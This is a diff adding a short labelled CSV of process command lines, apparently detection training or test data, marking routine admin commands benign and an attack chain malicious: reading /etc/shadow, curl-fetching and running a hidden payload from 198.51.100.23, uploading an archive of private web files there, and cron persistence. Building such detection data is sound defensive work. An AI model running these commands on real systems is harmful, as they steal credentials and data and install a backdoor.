@@ -1,0 +1,16 @@
+process_name,command_line,label
+bash,ls -la /home/deploy,benign
+python3,python3 /opt/app/manage.py migrate,benign
+git,git pull origin main,benign
+npm,npm ci --no-audit,benign
+systemctl,systemctl status nginx,benign
+bash,cat /etc/passwd,malicious
+bash,cat /etc/shadow,malicious
+curl,curl -s http://198.51.100.23/p.sh -o /tmp/.cache/.x,malicious
+chmod,chmod +x /tmp/.cache/.x,malicious
+bash,/tmp/.cache/.x &,malicious
+docker,docker ps -a,benign
+tar,tar czf /backups/web-2026-06-11.tar.gz /var/www,benign
+tar,tar czf /tmp/.cache/d.tgz /var/www/private,malicious
+curl,curl -s -F file=@/tmp/.cache/d.tgz http://198.51.100.23/upload,malicious
+crontab,(crontab -l; echo '*/5 * * * * /tmp/.cache/.x') | crontab -,malicious
